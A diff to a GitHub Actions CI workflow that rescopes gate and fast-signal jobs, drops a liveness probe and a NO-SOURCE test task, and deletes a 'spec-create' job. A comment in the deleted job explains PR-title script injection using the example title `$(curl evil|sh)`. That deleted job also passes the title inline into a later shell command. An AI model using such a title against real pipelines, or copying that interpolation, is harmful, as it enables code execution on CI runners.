@@ -308,6 +308,16 @@ jobs:
       # exactly its business. The condition is computed in the `changes` job
       # (`needs.changes.outputs.gates`) and carried here as a plain value, so
       # the shell asks the job and not a second copy of the corpus.
+      #
+      # And when the phase does run, it is scoped to the gates this change can
+      # have broken: a control proves that one gate can fail, and that proof
+      # belongs to the gate's own script and to the file its control edits.
+      # A change that touches neither cannot have broken the control, so the
+      # phase proves the affected gates and says which ones it skipped. When
+      # the scope cannot be read — no base ref, no merge-base, an empty
+      # change — the phase proves every gate, because a scope nobody can read
+      # is not a scope.
+      # ADR: docs/decisions/2026-11-09-the-control-phase-proves-the-affected-gates.md
       - name: Script gates (sgate run-all)
         env:
           WITH_CONTROLS: ${{ needs.changes.outputs.gates == 'true' || github.event_name == 'schedule' }}
@@ -371,10 +381,21 @@ jobs:
     runs-on: ubuntu-24.04
     timeout-minutes: 15
     needs: [changes]
+    # The gate scripts' own unit tests answer one question: does the corpus of
+    # the gates still work? The corpus is `scripts/**`, `config/**`,
+    # `.github/**`, `.githooks/**` — and `needs.changes.outputs.gates` is
+    # exactly that question, already answered by the job that has nothing
+    # else to do.
+    #
+    # The condition used to also ask `all`, and `all` is every path: the job
+    # ran on every pull request, including the ones that changed no gate
+    # script, and paid 303 s for a corpus nothing had touched.
+    #
+    # The trunk and a manual run still prove the corpus: the trunk is where
+    # the corpus lands, and a manual run is a request to see everything.
     if: >
       (
-        needs.changes.outputs.scripts == 'true'
-        || needs.changes.outputs.all == 'true'
+        needs.changes.outputs.gates == 'true'
         || github.ref == 'refs/heads/main'
         || github.event_name == 'workflow_dispatch'
       )
@@ -386,16 +407,8 @@ jobs:
       - name: Set up gate tooling
         uses: ./.github/actions/setup-python-tools
 
-      # Deno, for the same reason the static job installs it: the liveness
-      # probe below runs EVERY registered gate once, and the Edge Function's own
-      # tests are one of them. A gate the probe cannot run is reported as
-      # unrunnable, and the probe fails on it — a gate that needs a tool the
-      # probing job does not have is a gate that never runs anywhere.
-      - name: Set up Deno
-        run: npm install -g deno@2.9.5
-
       # The gate scripts' own unit tests: the regression tests for the wiring
-      # gate, the liveness probe and the controls.
+      # gate and the controls.
       #
       # The runner writes a JUnit XML report, and the report is uploaded as an
       # artifact: the rule this repository already wrote down for the Kotlin
@@ -415,17 +428,6 @@ jobs:
           path: build/diagnostics/gate-tests/*.xml
           if-no-files-found: error
           retention-days: 7
-
-      # "Gates are alive" — the probe that runs every registered gate once and
-      # reports the ones that die. It is the second full pass over the gate
-      # corpus (63 seconds), and it used to be inside the static job, where it
-      # doubled that job's cost to prove that gates do not crash.
-      #
-      # It probes the gates named in scripts/ci/static-gates.sh, and it is not
-      # one of them: a probe that probed itself would launch every gate, and
-      # every gate would launch the probe.
-      - name: Gates are alive
-        run: python3 scripts/check-gate-liveness.py
 
   # ── The detekt job ───────────────────────────────────────────────────────
   #
@@ -573,7 +575,16 @@ jobs:
     runs-on: ubuntu-24.04
     timeout-minutes: 25
     needs: [changes]
-    if: ${{ github.event_name == 'pull_request' }}
+    # This job is the fast signal: it answers "what is worth running first".
+    # When the run's population is `full`, the suite job runs the whole
+    # population — every module the map can select, at every tag — and the
+    # answer this job would give is a subset of a run that already happened.
+    # The two jobs then do the same work twice, and the second one costs 371 s.
+    #
+    # The population is read from the job that decided it, not from a label
+    # spelled here: one answer to "which half runs" is what keeps the two
+    # jobs from drifting apart.
+    if: ${{ github.event_name == 'pull_request' && needs.changes.outputs.population != 'full' }}
     permissions:
       actions: read
       contents: read
@@ -709,8 +720,9 @@ jobs:
         with:
           cache-encryption-key: ${{ secrets.GRADLE_ENCRYPTION_KEY }}
 
-      # The suite compiles and runs the Android target (`:shared:testAndroidHostTest`,
-      # `:androidApp:test`), so the platform the build declares has to be present.
+      # The suite compiles and runs the Android target
+      # (`:shared:testAndroidHostTest`), so the platform the build declares has
+      # to be present.
       - uses: ./.github/actions/setup-android-sdk
 
       # Same action as the static job, one reason: this job runs
@@ -802,10 +814,18 @@ jobs:
       # The coverage entry point (`koverReport`) used to be what put them into
       # this invocation: it dependsOn :shared:jvmTest,
       # :shared:testAndroidHostTest, :desktopApp:test, :mcp-server:test and
-      # :androidApp:test (build.gradle.kts:390-399). That is a second copy of
-      # the list that has to stay in step with kover's — and it is exactly how
-      # kover silently stops measuring a module. Naming the tasks here is the
+      # :androidApp:test (build.gradle.kts:589-599). The two lists overlap and
+      # are NOT copies: each names the tasks it runs — this one also runs
+      # :shared:archTest, :core-domain:jvmTest and :detekt-rules:test, and
+      # kover also aggregates :adr-core:jvmTest. Naming the tasks here is the
       # list itself, and the coverage job keeps the aggregate.
+      #
+      # :androidApp:test is not named here: the task is NO-SOURCE — the module
+      # has no JVM unit-test source set, its suite is `src/androidTest/`, which
+      # needs a device. It stays in kover's list, where it also contributes no
+      # data; `scripts/check-coverage-task-list.py` is the gate that answers the
+      # real question — does a project in the coverage denominator have a test
+      # source set with files in it.
       #
       # :mcp-server:jar is REQUIRED in this same invocation. McpServerEndToEndTest
       # resolves build/libs/mcp-server.jar, and the test task builds that JAR before
@@ -836,11 +856,14 @@ jobs:
       # A property of the task rather than of the invocation, so it holds in the
       # pre-push hook and in a local run too, and it cannot be forgotten by the
       # next step that adds a Gradle call.
-      # --no-parallel: org.gradle.parallel=true in gradle.properties lets two test
-      # tasks fork JVMs concurrently, which is the collision behind #471's
-      # EOFException in the jvmTest executor. The CLI flag overrides the property;
-      # determinism is worth the lost cross-project parallelism (same call the
-      # pre-push hook makes).
+      # --no-parallel: org.gradle.parallel=true in gradle.properties lets this ONE
+      # invocation's several test tasks fork JVMs concurrently, and they share one
+      # checkout -- that is the collision behind #471's EOFException in the
+      # jvmTest executor (CONTRIBUTING.md documents the shape; the ADR
+      # 2026-11-09-the-parallel-flag-stays-because-its-price-is-not-measurable
+      # records the measurement that says the flag costs nothing measurable).
+      # The CLI flag overrides the property; determinism is worth the lost
+      # cross-project parallelism (same call the pre-push hook makes).
       # The Gradle log is captured so check-test-runs.py can exempt UP-TO-DATE tasks
       # from the freshness check (a second consecutive run would otherwise falsely flag
       # a legitimately cached task as stale).
@@ -902,12 +925,12 @@ jobs:
       # `scripts/check-waiver-references.py` requires an anchor to resolve to a
       # STEP NAME — not to a name this file used to carry.
       - name: Gradle (tests)
-        # `:androidApp:test` is NO-SOURCE and runs zero tests: the module has
-        # no JVM unit-test source set — its suite is `src/androidTest/`, which
-        # needs a device and cannot run here. The task stays in this list so the
-        # list stays a copy of `koverReport`'s (build.gradle.kts:388-399), and
-        # `scripts/check-coverage-task-list.py` is the gate that answers the
-        # real question — does a project in the coverage denominator have a
+        # `:androidApp:test` is NOT named here: the task is NO-SOURCE and runs
+        # zero tests — the module has no JVM unit-test source set, its suite is
+        # `src/androidTest/`, which needs a device and cannot run here. Naming
+        # it would add a line that runs nothing and imply a suite that does not
+        # exist. `scripts/check-coverage-task-list.py` is the gate that answers
+        # the real question — does a project in the coverage denominator have a
         # test source set with files in it.
         run: |
           set -o pipefail
@@ -921,7 +944,6 @@ jobs:
             :shared:testAndroidHostTest \
             :desktopApp:test \
             :mcp-server:test \
-            :androidApp:test \
             :detekt-rules:test \
             :tools:unwritten-properties:test \
             -Ptest.population="$TEST_POPULATION" \
@@ -1347,7 +1369,11 @@ jobs:
 
       # Publish a live Allure report to GitHub Pages (Allure 2 via simple-elf).
       # Only on main: PR runs keep uploading the artifact above instead.
-      - name: Load Allure report history
+      #
+      # Advisory: the gh-pages branch does not exist until the first publish,
+      # so the checkout can fail on a trunk that has never published. A missing
+      # history is a report without a trend line, not a broken build.
+      - name: Load Allure report history (advisory)
         if: github.ref == 'refs/heads/main' && !cancelled()
         continue-on-error: true
         uses: actions/checkout@v7
@@ -1666,82 +1692,6 @@ jobs:
             echo "spec-kit workflow failed"
             exit 1
           }
-
-  spec-create:
-    if: github.event_name == 'pull_request' && (needs.changes.outputs.adr == 'true' || github.ref == 'refs/heads/main')
-    runs-on: ubuntu-latest
-    permissions:
-      contents: write
-    needs: [changes]
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      - name: Set up Java
-        uses: actions/setup-java@v4
-        with:
-          distribution: temurin
-          java-version: '21'
-
-      # uv as an action, not `curl … | sh`: the same installer the rest of ci.yml
-      # uses, so there is one way this repo gets uv on a runner.
-      - uses: astral-sh/setup-uv@v5
-        with:
-          python-version: '3.11'
-
-      - name: Install spec-kit
-        run: uv tool install specify-cli
-
-      # Same swallow as the adr-gate job's copy above; `check-workflow-exit-status.py`
-      # reported both, which is the point of running it over every workflow rather than
-      # the one the defect was found in.
-      - name: Install singularity-adr
-        run: |
-          set -o pipefail
-          ./gradlew :adr-cli:installDist 2>&1 | tail -5
-          echo "$PWD/adr-cli/build/install/singularity-adr/bin" >> "$GITHUB_PATH"
-
-      - name: Extract ADR slug from PR title
-        id: extract-slug
-        # The title is attacker-controlled (any PR author sets it), so it must
-        # reach the shell as data, never as source. Interpolating it inline —
-        # `TITLE="${{ github.event.pull_request.title }}"` — splices it into the
-        # script body, and a title of `$(curl evil|sh)` would execute. The env
-        # block binds it to a variable instead: the shell reads it after parsing,
-        # so no metacharacter in the value can become syntax. Found by actionlint
-        # (`expression`), not by any in-repo gate — the reason the workflow lint
-        # gate exists.
-        env:
-          PR_TITLE: ${{ github.event.pull_request.title }}
-        run: |
-          TITLE="$PR_TITLE"
-          # Convert title to kebab-case slug
-          SLUG=$(echo "$TITLE" | sed 's/[^a-zA-Z0-9 ]//g' | tr '[:upper:]' '[:lower:]' | tr ' ' '-' | sed 's/-+/-/g' | sed 's/^-//' | sed 's/-$//')
-          echo "slug=$SLUG" >> "$GITHUB_OUTPUT"
-          echo "title=$TITLE" >> "$GITHUB_OUTPUT"
-
-      - name: Run openspec-change workflow
-        run: |
-          specify workflow run openspec-change \
-            --input "slug=${{ steps.extract-slug.outputs.slug }},title=${{ steps.extract-slug.outputs.title }}" \
-            2>&1 || echo "Workflow run completed with warnings"
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-
-      - name: Commit new artifacts
-        run: |
-          git config --local user.email "github-actions[bot]@users.noreply.github.com"
-          git config --local user.name "github-actions[bot]"
-          git add docs/decisions/ openspec/changes/ .specify/issues/ 2>/dev/null || true
-          if git diff --cached --quiet; then
-            echo "No changes to commit"
-          else
-            git commit -m "docs: artifacts created via spec-kit openspec-change workflow
-
-            Created by github-actions workflow"
-            git push 2>&1 || echo "Push skipped (no permissions)"
-          fi
-
 
   # Nobody reads a red cron run. Open an issue instead, so the nightly failure has
   # somewhere to land other than a scrollback buffer.
